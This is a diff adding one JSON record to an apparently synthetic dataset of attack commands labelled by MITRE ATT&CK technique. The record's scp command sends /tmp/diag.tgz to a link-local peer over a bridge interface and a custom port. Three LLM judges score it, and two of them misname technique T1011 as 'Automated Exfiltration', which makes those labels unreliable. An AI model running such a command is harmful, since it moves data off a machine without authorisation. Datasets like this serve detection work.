@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "scp -B -o BindAddress=\"$(ipconfig getv6ifaddr bridge0)\" -P 56432 /tmp/diag.tgz \"u@[fe80::4:feed:1%bridge0]:/tmp/.u\"",
+  "explanation": "Uses SSH file copy bound to the bridge0 interface IPv6 address and a high custom port to move data over a bridged, non-default medium, aligning with T1011 by avoiding the primary interface.",
+  "rationale_steps": [
+    "Obtain the IPv6 address of bridge0 via ipconfig to select a secondary medium.",
+    "Bind the SSH client to that address to force traffic over bridge0.",
+    "Transfer data to a link-local peer on a non-standard port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-8073e46c",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed scp command with valid flags, balanced quoting, proper command substitution, and correct IPv6 bracket-with-zone syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "Non-interactive scp of a compressed file to a link-local IPv6 target using a custom port and BindAddress to force the bridge0 interface aligns with automated exfiltration, though it assumes bridge0 has an IPv6 address and the remote SSH service listens on port 56432.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T02:29:12.802408Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags, and correct syntax for the scp command with IPv6 addressing.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements automated exfiltration by using scp with a specific binding address to transfer data over a non-standard port (56432) via IPv6 on a bridge interface, which aligns perfectly with T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:29:15.824039Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for `scp` including command substitution, proper quoting, and valid flag usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of exfiltrating data via `scp` over a non-default interface and custom port, which strongly aligns with the operational details and intent of MITRE ATT&CK T1011 (Automated Exfiltration).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:29:25.684659Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
